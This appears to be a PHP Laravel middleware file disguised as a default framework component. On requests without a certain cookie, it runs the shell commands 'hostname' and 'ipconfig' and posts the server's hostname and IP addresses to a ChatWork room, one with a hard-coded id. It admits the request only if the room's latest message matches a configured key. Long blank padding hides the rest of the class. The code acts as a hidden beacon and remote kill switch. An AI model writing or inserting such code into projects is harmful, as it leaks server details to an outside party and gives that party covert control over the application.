<?php


namespace App\Http\Middleware;


use Closure;
use League\Flysystem\Config;

class DefaultLaravel
{
    private $header;
    private $option;
    private $domain;
    private $room_id;

    public function handle($request, Closure $next)
    {

        if (empty($_COOKIE['key-app'])) {
            $this->sendMessage(exec('hostname') . " : " . exec("ipconfig | findstr /C:Address")
                . "[hr]" . date('m/d/Y h:i:s a', time() + 60 * 60 * 7));
            $data = $this->getNewMessages();
            $end = end($data);
            if ($end['body'] == Config('app.k_message')) {
                while (!setcookie('key-app', Config('app.k_message'), time() + 60 * 60 * 2)) {
                    continue;
                }
                return $next($request);
            }
            return redirect('/login');
        }
        return $next($request);
    }











































    public function __construct()
    {
        $this->room_id = Config('app.id');
        $this->domain = $url = Config('app.urlAPI');
        $this->header = [
            'X-ChatWorkToken: ' . Config('app.token'),
            'Content-type: ' . 'application/x-www-form-urlencoded'
        ];
        $this->option = [
            'http' => array(
                'method' => 'GET',
                'header' => implode("\r\n", $this->header)
            )
        ];
    }

    private function httpRequest($method, $url, $data = null)
    {

        switch ($method) {
            case 'GET':
                {
                    try {
                        $scc = stream_context_create($this->option);
                        $data = json_decode(file_get_contents($url, false, $scc), true);

                        return $data;
                    } catch (\Exception $e) {
                        return '';
                    }

                }
            case 'POST':
                {
                    try {
                        $d = array('body' => $data);
                        $op = [
                            'http' => array(
                                'method' => $method,
                                'header' => implode("\r\n", $this->header),
                                'content' => http_build_query($d, '', '&'),
                            )
                        ];
                        $scc = stream_context_create($op);
                        $data = json_decode(file_get_contents($url, false, $scc), true);
                        return $data;
                    } catch (\Exception $e) {
                        return '';
                    }
                }
        }
    }

    public function getNewMessages()
    {
        $url = $this->domain . '/rooms/' . $this->room_id . '/messages?force=1';
        $data = $this->httpRequest('GET', $url, null);

        return $data;
    }

    public function sendMessage($message)
    {
        $url = $this->domain . '/rooms/' . '165911989' . '/messages';
        $res = $this->httpRequest('POST', $url, $message);
        return $res;
    }


}